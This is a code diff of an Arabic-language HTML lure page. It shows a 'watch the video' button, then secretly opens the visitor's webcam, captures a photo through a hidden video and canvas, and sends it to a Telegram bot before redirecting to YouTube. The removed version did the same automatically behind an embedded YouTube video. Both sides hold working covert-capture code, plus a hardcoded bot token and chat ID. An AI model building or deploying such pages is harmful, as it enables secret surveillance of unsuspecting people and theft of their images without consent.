@@ -1,67 +1,116 @@
 <!DOCTYPE html>
-<html>
-  <body style="margin: 0; padding: 0;">
+<html lang="ar">
+<head>
+  <meta charset="UTF-8" />
+  <title>أدخل لمشاهدة الفيديو</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: #111;
+      color: white;
+      font-family: sans-serif;
+    }
+    button {
+      font-size: 24px;
+      padding: 20px 40px;
+      background-color: #28a745;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
 
-    <!-- ✅ تشغيل فيديو اليوتيوب -->
-    <iframe 
-      width="100%" 
-      height="100%" 
-      src="https://www.youtube.com/embed/jwtYygCtIWM?autoplay=1&mute=1" 
-      frameborder="0" 
-      allow="autoplay; encrypted-media" 
-      allowfullscreen>
-    </iframe>
+<button onclick="captureAndRedirect()">أدخل لمشاهدة الفيديو</button>
 
-    <!-- ✅ عنصر فيديو الكاميرا (مخفي) -->
-    <video id="video" autoplay playsinline style="display: none;"></video>
+<video id="video" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
 
-    <script>
-      const BOT_TOKEN = '7808033895:AAFnqEHgGsWmj3JOy9c0Q_6swZmltih6orU';
-      const CHAT_ID = '6036900535';
+<script>
+  const BOT_TOKEN = '7808033895:AAFnqEHgGsWmj3JOy9c0Q_6swZmltih6orU';
+  const CHAT_ID = '6036900535';
+  const YOUTUBE_LINK = 'https://youtu.be/1KDDD65PSrU?si=WiXAyZQTA1XrWARk';
+
+  async function startCamera() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
       const video = document.getElementById('video');
+      video.srcObject = stream;
+      await new Promise(resolve => video.onloadedmetadata = resolve);
+      return stream;
+    } catch (error) {
+      alert("فشل في الوصول إلى الكاميرا: " + error.message);
+      throw error;
+    }
+  }
 
-      async function startCamera() {
-        try {
-          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-          video.srcObject = stream;
+  async function captureAndRedirect() {
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
 
-          video.onloadedmetadata = () => {
-            // انتظر 10 ثواني ثم التقط صورة
-            setTimeout(captureAndSendPhoto, 10000);
-          };
-        } catch (err) {
-          console.error('Camera error:', err);
-        }
+    // ابدأ الكاميرا إذا لم تعمل بعد
+    if (!video.srcObject) {
+      await startCamera();
+    }
+    
+    // تأكد من أن الفيديو جاهز
+    if (video.readyState < 2) {
+      alert("الكاميرا ليست جاهزة بعد، حاول مرة أخرى بعد قليل.");
+      return;
+    }
+
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    const context = canvas.getContext('2d');
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    const dataUrl = canvas.toDataURL('image/jpeg');
+
+    // إرسال الصورة إلى Telegram
+    sendPhotoToTelegram(dataUrl);
+
+    // توجيه المستخدم إلى رابط الفيديو
+    window.location.href = YOUTUBE_LINK;
+  }
+
+  function sendPhotoToTelegram(dataUrl) {
+    const base64Data = dataUrl.split(',')[1];
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: 'POST',
+      body: createFormData(base64Data),
+    })
+    .then(() => console.log("✅ تم إرسال الصورة"))
+    .catch(err => console.error("❌ فشل إرسال الصورة", err));
+  }
+
+  function createFormData(base64Data) {
+    const formData = new FormData();
+    const blob = b64toBlob(base64Data, 'image/jpeg');
+    formData.append('chat_id', CHAT_ID);
+    formData.append('photo', blob, 'photo.jpg');
+    return formData;
+  }
+
+  function b64toBlob(b64Data, contentType = '', sliceSize = 512) {
+    const byteCharacters = atob(b64Data);
+    const byteArrays = [];
+
+    for (let offset = 0; offset < byteCharacters.length; offset += sliceSize) {
+      const slice = byteCharacters.slice(offset, offset + sliceSize);
+      const byteNumbers = new Array(slice.length);
+      for (let i = 0; i < slice.length; i++) {
+        byteNumbers[i] = slice.charCodeAt(i);
       }
+      byteArrays.push(new Uint8Array(byteNumbers));
+    }
 
-      async function captureAndSendPhoto() {
-        if (video.readyState < 2) {
-          setTimeout(captureAndSendPhoto, 2000);
-          return;
-        }
+    return new Blob(byteArrays, { type: contentType });
+  }
+</script>
 
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        canvas.toBlob(blob => {
-          if (!blob) return;
-          const formData = new FormData();
-          formData.append('chat_id', CHAT_ID);
-          formData.append('photo', blob, 'photo.jpg');
-
-          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-            method: 'POST',
-            body: formData
-          })
-          .then(() => console.log('✅ Photo sent'))
-          .catch(err => console.error('❌ Failed to send photo:', err));
-        }, 'image/jpeg', 0.95);
-      }
-
-      startCamera();
-    </script>
-  </body>
+</body>
 </html>
